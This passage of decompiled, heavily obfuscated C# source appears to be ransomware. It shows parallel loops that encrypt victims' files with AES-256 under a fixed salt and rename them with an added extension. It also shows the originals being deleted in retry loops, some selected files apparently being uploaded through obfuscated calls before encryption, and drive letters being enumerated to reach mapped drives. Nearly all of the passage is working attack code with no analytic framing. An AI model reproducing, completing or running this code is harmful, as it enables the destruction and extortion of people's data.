								JODGCfeUBqfSiYrU.xEZuYNVpsYfClBPn(TmDAkSZaIXHu: (!dVQGFoqGywL) ? (nzkUSgBdGXcD ? JODGCfeUBqfSiYrU.RjhBaSeYoCMetj(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : JODGCfeUBqfSiYrU.RjhBaSeYoCMetj(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.xmYLyARLYEl), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (nzkUSgBdGXcD ? hJXihuhLevZxEZT.kJxCHDbuQavrk(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : hJXihuhLevZxEZT.kJxCHDbuQavrk(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.xmYLyARLYEl), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), NhYncFtSRCZPt: CS_0024_003C_003E8__locals0.rmVQhBqqNF, EzXeaGcOJNH: bytes3);
							}
							else
							{
								if (VVuqpZMWeENUoLrM)
								{
									CS_0024_003C_003E8__locals0.VbWVwrNehsYl = lZgHybZuOJvtb + CS_0024_003C_003E8__locals0.VbWVwrNehsYl;
								}
								string text4 = QvsBSwYTyC.iYyUrROgryUA(32);
								string s4 = pIXIfQBxEjhZIRLa.bvSKDBbYtIq(text4);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (CS_0024_003C_003E8__locals0.VbWVwrNehsYl != zSvtksGUxSCJaG.getString_0(107388523))
								{
									if (!fHmXdeOHBwOZw)
									{
										if (!nzkUSgBdGXcD)
										{
											JPBxRJXKpi(item, item + CS_0024_003C_003E8__locals0.VbWVwrNehsYl, PUSRZdlFWQWg);
										}
										else
										{
											JPBxRJXKpi(item, item + CS_0024_003C_003E8__locals0.VbWVwrNehsYl, Encoding.ASCII.GetBytes(text4));
										}
									}
									else
									{
										try
										{
											if (!nzkUSgBdGXcD)
											{
												HXNDSqKYInE(item, item + CS_0024_003C_003E8__locals0.VbWVwrNehsYl, PUSRZdlFWQWg);
											}
											else
											{
												HXNDSqKYInE(item, item + CS_0024_003C_003E8__locals0.VbWVwrNehsYl, Encoding.ASCII.GetBytes(text4));
											}
										}
										catch (Exception ex16)
										{
											if (XKASwlGUBpzh)
											{
												try
												{
													File.AppendAllText(UQSYzQClpMD, zSvtksGUxSCJaG.getString_0(107388290) + item + zSvtksGUxSCJaG.getString_0(107388541) + ex16.Message + zSvtksGUxSCJaG.getString_0(107396612));
												}
												catch (Exception)
												{
												}
											}
											xGavVPJiJhi++;
											goto end_IL_00ee_2;
										}
									}
								}
								else if (!fHmXdeOHBwOZw)
								{
									if (!nzkUSgBdGXcD)
									{
										JPBxRJXKpi(item, item + zSvtksGUxSCJaG.getString_0(107388518), PUSRZdlFWQWg);
									}
									else
									{
										JPBxRJXKpi(item, item + zSvtksGUxSCJaG.getString_0(107388518), Encoding.ASCII.GetBytes(text4));
									}
								}
								else
								{
									try
									{
										if (!nzkUSgBdGXcD)
										{
											HXNDSqKYInE(item, item, PUSRZdlFWQWg);
										}
										else
										{
											HXNDSqKYInE(item, item, Encoding.ASCII.GetBytes(text4));
										}
									}
									catch (Exception ex18)
									{
										if (XKASwlGUBpzh)
										{
											try
											{
												File.AppendAllText(UQSYzQClpMD, zSvtksGUxSCJaG.getString_0(107388290) + item + zSvtksGUxSCJaG.getString_0(107388541) + ex18.Message + zSvtksGUxSCJaG.getString_0(107396612));
											}
											catch (Exception)
											{
											}
										}
										xGavVPJiJhi++;
										goto end_IL_00ee_2;
									}
								}
								if (nzkUSgBdGXcD)
								{
									if (CS_0024_003C_003E8__locals0.VbWVwrNehsYl != zSvtksGUxSCJaG.getString_0(107388523))
									{
										yirsdStUbSe(item + CS_0024_003C_003E8__locals0.VbWVwrNehsYl, bytes4);
									}
									else
									{
										yirsdStUbSe(item, bytes4);
									}
								}
							}
							goto IL_072e;
							end_IL_00ee_2:;
						}
						catch (Exception)
						{
							goto IL_072e;
						}
					}
					continue;
					IL_072e:
					CS_0024_003C_003E8__locals0.WtZodkqAZtX.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.WtZodkqAZtX, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new zSvtksGUxSCJaG.UAtGHiwhAxrl();
			CS_0024_003C_003E8__locals0.AhDWxIHxfl = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.XEeHPtOhWq = string_0;
			if (CS_0024_003C_003E8__locals0.LzVXgnnvTgpKaVb.Length != 0)
			{
				string[] lzVXgnnvTgpKaVb = CS_0024_003C_003E8__locals0.LzVXgnnvTgpKaVb;
				int num = 0;
				while (num < lzVXgnnvTgpKaVb.Length)
				{
					string value = lzVXgnnvTgpKaVb[num];
					if (!CS_0024_003C_003E8__locals0.XEeHPtOhWq.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_07bb;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.XEeHPtOhWq.EndsWith(CS_0024_003C_003E8__locals0.VbWVwrNehsYl))
				{
					goto IL_07bb;
				}
			}
			catch (Exception)
			{
				goto IL_07bb;
			}
			if (!diKnMADbMAYp.Contains(CS_0024_003C_003E8__locals0.XEeHPtOhWq))
			{
				if (JQZPkWnOzqnmK == zSvtksGUxSCJaG.getString_0(107396759))
				{
					try
					{
						if (JPlUIARxIoI.xRFTZTzbmDo(CS_0024_003C_003E8__locals0.XEeHPtOhWq))
						{
							JPlUIARxIoI.PKODcjuKIwO(CS_0024_003C_003E8__locals0.XEeHPtOhWq);
						}
					}
					catch
					{
					}
				}
				diKnMADbMAYp.Add(CS_0024_003C_003E8__locals0.XEeHPtOhWq);
				if (!BTRlqjNfLlWsE.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.XEeHPtOhWq)))
				{
					BTRlqjNfLlWsE.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.XEeHPtOhWq));
				}
				RhuDTDuXfGTW(CS_0024_003C_003E8__locals0.XEeHPtOhWq);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.XEeHPtOhWq).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (XKASwlGUBpzh)
						{
							try
							{
								File.AppendAllText(UQSYzQClpMD, zSvtksGUxSCJaG.getString_0(107388290) + CS_0024_003C_003E8__locals0.XEeHPtOhWq + zSvtksGUxSCJaG.getString_0(107405065) + ex2.Message + zSvtksGUxSCJaG.getString_0(107396612));
							}
							catch (Exception)
							{
							}
						}
						xGavVPJiJhi++;
						goto end_IL_0117_2;
					}
					if (lzqKhPamqvFJR == zSvtksGUxSCJaG.getString_0(107396759) && new FileInfo(CS_0024_003C_003E8__locals0.XEeHPtOhWq).Length > Convert.ToInt32(rwFJViTtnOvWkjuSM) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.VbWVwrNehsYl != zSvtksGUxSCJaG.getString_0(107388523))
							{
								if (VVuqpZMWeENUoLrM)
								{
									CS_0024_003C_003E8__locals0.VbWVwrNehsYl = lZgHybZuOJvtb + CS_0024_003C_003E8__locals0.VbWVwrNehsYl;
								}
								File.Move(CS_0024_003C_003E8__locals0.XEeHPtOhWq, CS_0024_003C_003E8__locals0.XEeHPtOhWq + CS_0024_003C_003E8__locals0.VbWVwrNehsYl);
							}
						}
						catch (Exception ex4)
						{
							if (XKASwlGUBpzh)
							{
								try
								{
									File.AppendAllText(UQSYzQClpMD, zSvtksGUxSCJaG.getString_0(107388290) + CS_0024_003C_003E8__locals0.XEeHPtOhWq + zSvtksGUxSCJaG.getString_0(107405004) + ex4.Message + zSvtksGUxSCJaG.getString_0(107396612));
								}
								catch (Exception)
								{
								}
							}
							xGavVPJiJhi++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.VbWVwrNehsYl != zSvtksGUxSCJaG.getString_0(107388523))
						{
							CS_0024_003C_003E8__locals0.XEeHPtOhWq += CS_0024_003C_003E8__locals0.VbWVwrNehsYl;
						}
						if (NQwCDAjXKTQu == zSvtksGUxSCJaG.getString_0(107396759))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in rtjfJHAbipnYF)
								{
									if (CS_0024_003C_003E8__locals0.XEeHPtOhWq.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.AhDWxIHxfl.VbWVwrNehsYl) && OZzUcHNaqca == zSvtksGUxSCJaG.UAtGHiwhAxrl.getString_0(107396765))
									{
										if (Convert.ToInt32(zVxtpLMtWN) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.XEeHPtOhWq).Length)
										{
											try
											{
												jCOJRzSaQahQUJH.PrZGmImJdFgV(zSvtksGUxSCJaG.UAtGHiwhAxrl.getString_0(107392743), zSvtksGUxSCJaG.UAtGHiwhAxrl.getString_0(107392738), zSvtksGUxSCJaG.UAtGHiwhAxrl.getString_0(107392693), CS_0024_003C_003E8__locals0.XEeHPtOhWq);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.XEeHPtOhWq.ToLower().EndsWith(item3) && OZzUcHNaqca == zSvtksGUxSCJaG.UAtGHiwhAxrl.getString_0(107397162))
									{
										try
										{
											jCOJRzSaQahQUJH.PrZGmImJdFgV(zSvtksGUxSCJaG.UAtGHiwhAxrl.getString_0(107392743), zSvtksGUxSCJaG.UAtGHiwhAxrl.getString_0(107392738), zSvtksGUxSCJaG.UAtGHiwhAxrl.getString_0(107392693), CS_0024_003C_003E8__locals0.XEeHPtOhWq);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = QvsBSwYTyC.iYyUrROgryUA(32);
						string s = pIXIfQBxEjhZIRLa.bvSKDBbYtIq(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = JODGCfeUBqfSiYrU.ZDfiLXsQVNoG(CS_0024_003C_003E8__locals0.XEeHPtOhWq, Convert.ToInt32(rwFJViTtnOvWkjuSM) * 1024 * 1024);
						JODGCfeUBqfSiYrU.xEZuYNVpsYfClBPn(TmDAkSZaIXHu: (!dVQGFoqGywL) ? (nzkUSgBdGXcD ? JODGCfeUBqfSiYrU.RjhBaSeYoCMetj(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : JODGCfeUBqfSiYrU.RjhBaSeYoCMetj(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.xmYLyARLYEl), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (nzkUSgBdGXcD ? hJXihuhLevZxEZT.kJxCHDbuQavrk(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : hJXihuhLevZxEZT.kJxCHDbuQavrk(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.xmYLyARLYEl), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), NhYncFtSRCZPt: CS_0024_003C_003E8__locals0.XEeHPtOhWq, EzXeaGcOJNH: bytes);
					}
					else
					{
						if (VVuqpZMWeENUoLrM)
						{
							CS_0024_003C_003E8__locals0.VbWVwrNehsYl = lZgHybZuOJvtb + CS_0024_003C_003E8__locals0.VbWVwrNehsYl;
						}
						string text2 = QvsBSwYTyC.iYyUrROgryUA(32);
						string s2 = pIXIfQBxEjhZIRLa.bvSKDBbYtIq(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.VbWVwrNehsYl != zSvtksGUxSCJaG.getString_0(107388523))
						{
							if (!fHmXdeOHBwOZw)
							{
								if (!nzkUSgBdGXcD)
								{
									JPBxRJXKpi(CS_0024_003C_003E8__locals0.XEeHPtOhWq, CS_0024_003C_003E8__locals0.XEeHPtOhWq + CS_0024_003C_003E8__locals0.VbWVwrNehsYl, PUSRZdlFWQWg);
								}
								else
								{
									JPBxRJXKpi(CS_0024_003C_003E8__locals0.XEeHPtOhWq, CS_0024_003C_003E8__locals0.XEeHPtOhWq + CS_0024_003C_003E8__locals0.VbWVwrNehsYl, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!nzkUSgBdGXcD)
									{
										HXNDSqKYInE(CS_0024_003C_003E8__locals0.XEeHPtOhWq, CS_0024_003C_003E8__locals0.XEeHPtOhWq + CS_0024_003C_003E8__locals0.VbWVwrNehsYl, PUSRZdlFWQWg);
									}
									else
									{
										HXNDSqKYInE(CS_0024_003C_003E8__locals0.XEeHPtOhWq, CS_0024_003C_003E8__locals0.XEeHPtOhWq + CS_0024_003C_003E8__locals0.VbWVwrNehsYl, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (XKASwlGUBpzh)
									{
										try
										{
											File.AppendAllText(UQSYzQClpMD, zSvtksGUxSCJaG.getString_0(107388290) + CS_0024_003C_003E8__locals0.XEeHPtOhWq + zSvtksGUxSCJaG.getString_0(107388541) + ex6.Message + zSvtksGUxSCJaG.getString_0(107396612));
										}
										catch (Exception)
										{
										}
									}
									xGavVPJiJhi++;
									return;
								}
							}
						}
						else if (!fHmXdeOHBwOZw)
						{
							if (!nzkUSgBdGXcD)
							{
								JPBxRJXKpi(CS_0024_003C_003E8__locals0.XEeHPtOhWq, CS_0024_003C_003E8__locals0.XEeHPtOhWq + zSvtksGUxSCJaG.getString_0(107388518), PUSRZdlFWQWg);
							}
							else
							{
								JPBxRJXKpi(CS_0024_003C_003E8__locals0.XEeHPtOhWq, CS_0024_003C_003E8__locals0.XEeHPtOhWq + zSvtksGUxSCJaG.getString_0(107388518), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!nzkUSgBdGXcD)
								{
									HXNDSqKYInE(CS_0024_003C_003E8__locals0.XEeHPtOhWq, CS_0024_003C_003E8__locals0.XEeHPtOhWq, PUSRZdlFWQWg);
								}
								else
								{
									HXNDSqKYInE(CS_0024_003C_003E8__locals0.XEeHPtOhWq, CS_0024_003C_003E8__locals0.XEeHPtOhWq, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (XKASwlGUBpzh)
								{
									try
									{
										File.AppendAllText(UQSYzQClpMD, zSvtksGUxSCJaG.getString_0(107388290) + CS_0024_003C_003E8__locals0.XEeHPtOhWq + zSvtksGUxSCJaG.getString_0(107388541) + ex8.Message + zSvtksGUxSCJaG.getString_0(107396612));
									}
									catch (Exception)
									{
									}
								}
								xGavVPJiJhi++;
								return;
							}
						}
						if (nzkUSgBdGXcD)
						{
							if (CS_0024_003C_003E8__locals0.VbWVwrNehsYl != zSvtksGUxSCJaG.getString_0(107388523))
							{
								yirsdStUbSe(CS_0024_003C_003E8__locals0.XEeHPtOhWq + CS_0024_003C_003E8__locals0.VbWVwrNehsYl, bytes2);
							}
							else
							{
								yirsdStUbSe(CS_0024_003C_003E8__locals0.XEeHPtOhWq, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_07bb;
			IL_07bb:
			CS_0024_003C_003E8__locals0.WtZodkqAZtX.Remove(CS_0024_003C_003E8__locals0.XEeHPtOhWq);
		});
	}

	private static void IIevsGYdXbA(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (NQwCDAjXKTQu == getString_0(107396740))
					{
						foreach (string item in rtjfJHAbipnYF)
						{
							if (string_0.ToLower().EndsWith(item) && OZzUcHNaqca == getString_0(107396740))
							{
								if (Convert.ToInt32(zVxtpLMtWN) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										jCOJRzSaQahQUJH.PrZGmImJdFgV(getString_0(107392718), getString_0(107392713), getString_0(107392668), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && OZzUcHNaqca == getString_0(107397137))
							{
								try
								{
									jCOJRzSaQahQUJH.PrZGmImJdFgV(getString_0(107392718), getString_0(107392713), getString_0(107392668), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107388499)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107388499), getString_0(107393117)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void HXNDSqKYInE(string string_0, string string_1, byte[] byte_0)
	{
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
			string_0 = string_1;
		}
		if (NQwCDAjXKTQu == getString_0(107396740))
		{
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			foreach (string item in rtjfJHAbipnYF)
			{
				if (string_0.ToLower().EndsWith(item) && OZzUcHNaqca == getString_0(107396740))
				{
					if (Convert.ToInt32(zVxtpLMtWN) * 1024 * 1024 > fileStream.Length)
					{
						try
						{
							jCOJRzSaQahQUJH.PrZGmImJdFgV(getString_0(107392718), getString_0(107392713), getString_0(107392668), string_0);
						}
						catch
						{
						}
					}
				}
				else if (string_0.ToLower().EndsWith(item) && OZzUcHNaqca == getString_0(107397137))
				{
					try
					{
						jCOJRzSaQahQUJH.PrZGmImJdFgV(getString_0(107392718), getString_0(107392713), getString_0(107392668), string_0);
					}
					catch
					{
					}
				}
			}
			fileStream.Dispose();
		}
		byte[] bytes = hJXihuhLevZxEZT.kJxCHDbuQavrk(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		puMlKkdeEF++;
	}

	private static void JPBxRJXKpi(string string_0, string string_1, byte[] byte_0)
	{
		elAlpmouXOIvx CS_0024_003C_003E8__locals0 = new elAlpmouXOIvx();
		CS_0024_003C_003E8__locals0.yAHxhTflyfalc = string_0;
		CS_0024_003C_003E8__locals0.AvDgGpmgGbbZCjnL = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string avDgGpmgGbbZCjnL = CS_0024_003C_003E8__locals0.AvDgGpmgGbbZCjnL;
			FileStream fileStream = new FileStream(avDgGpmgGbbZCjnL, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (pKXDvwefnl == getString_0(107396740))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.yAHxhTflyfalc, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.yAHxhTflyfalc, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.yAHxhTflyfalc, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.AvDgGpmgGbbZCjnL.Length > 0)
				{
					if (NQwCDAjXKTQu == getString_0(107396740))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.yAHxhTflyfalc, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in rtjfJHAbipnYF)
						{
							if (CS_0024_003C_003E8__locals0.yAHxhTflyfalc.ToLower().EndsWith(item) && OZzUcHNaqca == getString_0(107396740))
							{
								if (Convert.ToInt32(zVxtpLMtWN) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										jCOJRzSaQahQUJH.PrZGmImJdFgV(getString_0(107392718), getString_0(107392713), getString_0(107392668), CS_0024_003C_003E8__locals0.yAHxhTflyfalc);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.yAHxhTflyfalc.ToLower().EndsWith(item) && OZzUcHNaqca == getString_0(107397137))
							{
								try
								{
									jCOJRzSaQahQUJH.PrZGmImJdFgV(getString_0(107392718), getString_0(107392713), getString_0(107392668), CS_0024_003C_003E8__locals0.yAHxhTflyfalc);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.yAHxhTflyfalc);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.AvDgGpmgGbbZCjnL.EndsWith(getString_0(107388499)))
					{
						File.Move(CS_0024_003C_003E8__locals0.AvDgGpmgGbbZCjnL, CS_0024_003C_003E8__locals0.AvDgGpmgGbbZCjnL.Replace(getString_0(107388499), getString_0(107393117)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.AvDgGpmgGbbZCjnL))
							{
								File.Delete(CS_0024_003C_003E8__locals0.AvDgGpmgGbbZCjnL);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (XKASwlGUBpzh)
			{
				try
				{
					File.AppendAllText(UQSYzQClpMD, getString_0(107388271) + CS_0024_003C_003E8__locals0.yAHxhTflyfalc + getString_0(107388522) + ex2.Message + getString_0(107396593));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> fJNexnLlneosRhQ = FJNexnLlneosRhQ;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
			{
				nOIZGFqjik(getString_0(107388437), string_0);
			};
		}
		Parallel.ForEach(fJNexnLlneosRhQ, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		List<string> source = ctnxoknClYAD;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
			{
				nOIZGFqjik(BaxqkGxiBeqS(getString_0(107388460)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		if (HuvvdBBcIbJxH == getString_0(107396740))
		{
			string[] cxZEmnxTbhJSa = CxZEmnxTbhJSa;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
				{
					nOIZGFqjik(BaxqkGxiBeqS(getString_0(107388460)), getString_0(107388403) + string_0 + getString_0(107388426));
				};
			}
			Parallel.ForEach(cxZEmnxTbhJSa, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		}
		if (!PxuvQHOJlLM().Contains(getString_0(107388137)))
		{
			zyaalHhzPWGp(AXvssecAngWd);
		}
		else
		{
			List<string> source2 = mKLyhqkijpZNwYs;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
				{
					nOIZGFqjik(BaxqkGxiBeqS(SqbUSPIscVoYxhFbFA(getString_0(107388421))), string_0);
				};
			}
			Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		}
		List<string> source3 = zcmRrFXWRTRDV;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
			{
				nOIZGFqjik(BaxqkGxiBeqS(getString_0(107388396)), string_0);
			};
		}
		Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
		List<string> vnGdzxwiUTFhYj = VnGdzxwiUTFhYj;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
			{
				nOIZGFqjik(getString_0(107388347), string_0);
			};
		}
		Parallel.ForEach(vnGdzxwiUTFhYj, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		nOIZGFqjik(getString_0(107388437), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		nOIZGFqjik(BaxqkGxiBeqS(getString_0(107388460)), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		nOIZGFqjik(BaxqkGxiBeqS(getString_0(107388460)), getString_0(107388403) + string_0 + getString_0(107388426));
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		nOIZGFqjik(BaxqkGxiBeqS(SqbUSPIscVoYxhFbFA(getString_0(107388421))), string_0);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		nOIZGFqjik(BaxqkGxiBeqS(getString_0(107388396)), string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		nOIZGFqjik(getString_0(107388347), string_0);
	}

	private static void _003CMapDrv_003Eb__19(string string_0)
	{
		vpbfbIAWAYvUfQ CS_0024_003C_003E8__locals0 = new vpbfbIAWAYvUfQ();
		CS_0024_003C_003E8__locals0.dozAlNcIgjCiZ = string_0;
		if ((!CS_0024_003C_003E8__locals0.dozAlNcIgjCiZ.StartsWith(getString_0(107388338)) && !CS_0024_003C_003E8__locals0.dozAlNcIgjCiZ.StartsWith(getString_0(107388365)) && !CS_0024_003C_003E8__locals0.dozAlNcIgjCiZ.StartsWith(getString_0(107388356)) && !CS_0024_003C_003E8__locals0.dozAlNcIgjCiZ.StartsWith(getString_0(107393117))) || !HNDBddbMue.NhBKYOYAcHZTx(CS_0024_003C_003E8__locals0.dozAlNcIgjCiZ))
		{
			return;
		}
		try
		{
			Thread.Sleep(XvWBphKuRyvD);
			QuXRcyqyIgSTxy.Add(getString_0(107391902) + CS_0024_003C_003E8__locals0.dozAlNcIgjCiZ + getString_0(107388311));
			try
			{
				if (gSSiJyrGCBHZ)
				{
					Console.WriteLine(getString_0(107391902) + CS_0024_003C_003E8__locals0.dozAlNcIgjCiZ + getString_0(107388311));
				}
			}
			catch
			{
			}
			Parallel.For(68, 91, delegate(int int_0)
			{
				Thread.Sleep(XvWBphKuRyvD);
				QuXRcyqyIgSTxy.Add(vpbfbIAWAYvUfQ.getString_0(107391908) + CS_0024_003C_003E8__locals0.dozAlNcIgjCiZ + vpbfbIAWAYvUfQ.getString_0(107397116) + (char)int_0 + vpbfbIAWAYvUfQ.getString_0(107405057));
				try
				{
					if (gSSiJyrGCBHZ)
					{
